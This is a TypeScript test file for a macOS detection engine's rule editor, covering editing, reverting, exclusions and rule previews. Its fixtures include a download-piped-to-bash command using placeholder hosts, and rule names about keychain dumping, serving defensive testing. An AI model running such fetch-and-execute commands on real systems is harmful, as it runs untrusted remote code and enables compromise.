import { describe, expect, it } from 'vitest';
import { DetectionEngine } from '../engine.js';
import { exclusionFor, RuleEditor } from '../editing.js';
import { mergeRules } from '../merge.js';
import { macosCoreRules } from '../packs/macos-core.js';
import { memoryStores } from '../state/stores.js';
import type { RuleRepository } from '../state/sqlite.js';
import type { DetectionRule } from '../types.js';
import { userOrigin } from '../user.js';
import { connect, exec, HOUR, proc, shell, T0 } from './fixtures.js';

const me = userOrigin('test');

class MemoryRepo implements RuleRepository {
  readonly saved = new Map<string, DetectionRule>();
  save(rule: DetectionRule): void {
    this.saved.set(rule.id, rule);
  }
  remove(id: string): void {
    this.saved.delete(id);
  }
  list(): DetectionRule[] {
    return [...this.saved.values()];
  }
}

function setup() {
  const stores = memoryStores();
  const engine = new DetectionEngine(macosCoreRules, stores);
  const repo = new MemoryRepo();
  let now = T0;
  const editor = new RuleEditor(engine, macosCoreRules, repo, stores.history, {
    now: () => now,
  });
  return { stores, engine, repo, editor, tick: (ms: number) => (now += ms) };
}

const curlPipe = exec(shell('curl -fsSL https://x.example/i.sh | bash'));

describe('RuleEditor', () => {
  it('edits a built-in, keeps the shipped version, and reverts it', () => {
    const { engine, repo, editor } = setup();
    const before = editor.view('download-pipe-to-shell')!;
    expect(before).toMatchObject({ origin: 'builtin', edited: false });

    const r = editor.save(
      { ...before.rule, name: 'Script piped from the internet', mode: 'block' },
      me,
    );
    expect(r.errors).toEqual([]);
    expect(r.rule).toMatchObject({
      version: before.rule.version + 1,
      editedFrom: before.rule.version,
    });
    const after = editor.view('download-pipe-to-shell')!;
    expect(after).toMatchObject({ edited: true, mode: 'block', builtinUpdateAvailable: false });
    expect(repo.saved.has('download-pipe-to-shell')).toBe(true);
    expect(
      engine.evaluate(curlPipe).find((d) => d.match.ruleId === 'download-pipe-to-shell')?.mode,
    ).toBe('block');

    editor.revert('download-pipe-to-shell', me);
    expect(editor.view('download-pipe-to-shell')).toMatchObject({
      edited: false,
      mode: before.mode,
    });
    expect(engine.getRule('download-pipe-to-shell')!.name).toBe(before.rule.name);
    expect(repo.saved.has('download-pipe-to-shell')).toBe(false);
  });

  it('keeps a user edit over the pack and flags a newer shipped version', () => {
    const { editor, repo } = setup();
    const base = editor.view('keychain-dump')!.rule;
    editor.save({ ...base, severity: 'critical' }, me);
    const shipped = macosCoreRules.map((r) =>
      r.id === 'keychain-dump' ? { ...r, version: 5 } : r,
    );
    const engine2 = new DetectionEngine(mergeRules(shipped, repo.list()), memoryStores());
    expect(engine2.getRule('keychain-dump')!.severity).toBe('critical');
    const editor2 = new RuleEditor(engine2, shipped, repo, memoryStores().history);
    expect(editor2.view('keychain-dump')).toMatchObject({
      edited: true,
      builtinUpdateAvailable: true,
    });
  });

  it('rejects invalid or unsafe drafts without touching the running rule', () => {
    const { editor, engine } = setup();
    const rule = editor.view('keychain-dump')!.rule;
    const bad = editor.save(
      { ...rule, condition: { field: 'process.nme', op: 'eq', value: 'x' } },
      me,
    );
    expect(bad.ok).toBe(false);
    expect(bad.errors.join(' ')).toMatch(/process\.nme/);
    const release = editor.save(
      { ...rule, response: [{ kind: 'process.resume', pid: '{{process.pid}}' }] },
      me,
    );
    expect(release.ok).toBe(false);
    const broad = editor.addExclusion(rule.id, { field: 'process.path', op: 'exists' }, me);
    expect(broad.ok).toBe(false);
    expect(engine.getRule('keychain-dump')).toEqual(rule);
  });

  it('creates, previews and deletes a rule of your own; built-ins cannot be deleted', () => {
    const { editor, stores, engine, tick } = setup();
    for (let i = 0; i < 5; i++) {
      stores.history.append({
        ...connect(proc({ path: '/Applications/Tool.app/x' }), '9.9.9.9', 'paste.example'),
        ts: T0 - (i + 1) * HOUR,
      });
    }
    tick(0);
    const draft = {
      id: 'my-paste-sites',
      name: 'Paste sites',
      mode: 'alert',
      severity: 'medium',
      eventKinds: ['network.connection'],
      condition: { field: 'remoteHost', op: 'eq', value: 'paste.example' },
      reasons: ['{{process.name}} talked to {{remoteHost}}.'],
    };
    const p = editor.preview(draft);
    expect(p.errors).toEqual([]);
    expect(p.replay).toMatchObject({ hits: 5 });
    expect(editor.save(draft, me).rule).toMatchObject({ origin: 'user', version: 1 });
    expect(editor.view('my-paste-sites')).toMatchObject({ origin: 'user', edited: false });
    editor.delete('my-paste-sites', me);
    expect(engine.getRule('my-paste-sites')).toBeUndefined();
    expect(() => editor.delete('keychain-dump', me)).toThrow(/turned off/);
  });

  it('adds and removes exclusions, including straight from an alert', () => {
    const { editor, engine } = setup();
    const tool = proc({
      path: '/Applications/Installer.app/Contents/MacOS/inst',
      teamId: 'ABCDE12345',
      signingId: 'com.example.inst',
      signing: 'developer_id',
    });
    const withParent = exec({
      ...shell('curl -fsSL https://get.example/i.sh | bash'),
      teamId: tool.teamId!,
      signingId: tool.signingId!,
    });
    expect(
      engine.evaluate(withParent).some((d) => d.match.ruleId === 'download-pipe-to-shell'),
    ).toBe(true);

    const r = editor.excludeEvent('download-pipe-to-shell', withParent, 'this_signer', me);
    expect(r.ok).toBe(true);
    expect(
      engine.evaluate(withParent).some((d) => d.match.ruleId === 'download-pipe-to-shell'),
    ).toBe(false);
    expect(engine.evaluate(curlPipe).some((d) => d.match.ruleId === 'download-pipe-to-shell')).toBe(
      true,
    );
    expect(
      editor.addExclusion('download-pipe-to-shell', r.rule!.exclusions.at(-1), me).warnings,
    ).toHaveLength(1);

    const n = engine.getRule('download-pipe-to-shell')!.exclusions.length;
    editor.removeExclusion('download-pipe-to-shell', n - 1, me);
    expect(
      engine.evaluate(withParent).some((d) => d.match.ruleId === 'download-pipe-to-shell'),
    ).toBe(true);
  });

  it('builds the narrowest exclusion the event supports', () => {
    const p = proc({ path: '/tmp/x', sha256: 'a'.repeat(64) });
    expect(exclusionFor(exec(p), 'this_binary')).toEqual({
      field: 'process.sha256',
      op: 'eq',
      value: 'a'.repeat(64),
    });
    expect(exclusionFor(exec(p), 'this_signer')).toBeUndefined();
    expect(exclusionFor(connect(p, '1.2.3.4', 'a.example'), 'this_host')).toEqual({
      field: 'remoteHost',
      op: 'eq',
      value: 'a.example',
    });
    expect(exclusionFor(connect(p, '1.2.3.4'), 'this_host')).toEqual({
      field: 'remoteAddress',
      op: 'eq',
      value: '1.2.3.4',
    });
  });

  it('needs a user origin for every change', () => {
    const { editor } = setup();
    const fake = { by: 'ai' } as unknown as typeof me;
    expect(() => editor.save(editor.view('keychain-dump')!.rule, fake)).toThrow();
    expect(() => editor.revert('keychain-dump', fake)).toThrow();
  });
});
